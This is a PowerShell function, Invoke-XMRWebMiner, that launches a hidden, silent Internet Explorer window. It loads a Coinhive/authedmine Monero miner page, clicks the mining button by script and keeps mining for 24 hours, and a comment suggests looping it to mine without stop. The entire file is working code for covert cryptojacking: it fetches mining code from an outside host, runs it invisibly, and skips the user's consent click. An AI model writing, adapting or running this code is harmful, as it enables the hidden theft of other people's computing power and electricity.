function Invoke-XMRWebMiner {

$ie=New-Object -comobject InternetExplorer.Application
$ie.visible = $False
$ie.Silent = $true
$ie.navigate('https://authedmine.com/media/miner.html?key=<enter your coinhive key>')
while($ie.busy){Start-Sleep 3}
$link = @($ie.Document.documentElement.getElementsByClassName(("mining-button")))
$link.click()
while ($ie.Busy) {
    # CoinHive will only run your miner for 24hrs at a time. So, we time it and cleanly exit internet explorer after 24 hours.
    # You could loop this to restart if you wanted to mine uninterrupted.
    [System.Threading.Thread]::Sleep(86400)
}
$ie.quit
}

